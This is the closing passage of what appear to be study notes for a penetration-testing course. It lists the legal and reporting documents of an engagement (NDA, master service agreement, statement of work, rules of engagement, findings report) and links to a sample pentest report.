</code></pre><h1 id="5d306c73-a254-41ff-aa08-b71a87e24683" class=""><strong>Report</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#report"></a></strong></h1><h2 id="248783be-cef2-4a21-a53a-4d2143f3e035" class=""><strong>Common Legal Documents</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#common-legal-documents"></a></strong></h2><p id="9844fa0c-921f-4426-87a2-fcda1b9ed071" class="">Sales:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a0070639-c0f3-4744-833f-76aa71195871" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Mutual Non-Disclosure Agreement (NDA)
Master Service Agreement (MSA)
Statement of Work (SOW)
Other: Sample Report, Recommendation Letters, etc
</code></pre><p id="87e7406d-b619-4efb-8753-ee7d22e9cc53" class="">Before you Test:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d2c28030-4d37-4036-b275-4aefb92561f7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Rules of Engagement (ROE)
</code></pre><p id="57c6e7f2-deac-44ab-9354-af9865af77fa" class="">After you Test:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0efad5c1-5299-40d6-affe-9cb57b7f9068" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Findings Report
</code></pre><h2 id="5da1ee71-c403-4f87-b2d7-47fa2633b71d" class=""><strong>Pentest Report Writing</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#pentest-report-writing"></a></strong></h2><p id="f56db3c8-a7b9-44d1-805e-85e3d48a6439" class="">→ https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report</p><p id="4a76d710-a754-4e96-93b3-638c017264de" class="">→ https://tcm-sec.com/wp-content/uploads/2021/10/TCMS-Demo-Corp-Security-Assessment-Findings-Report.pdf</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>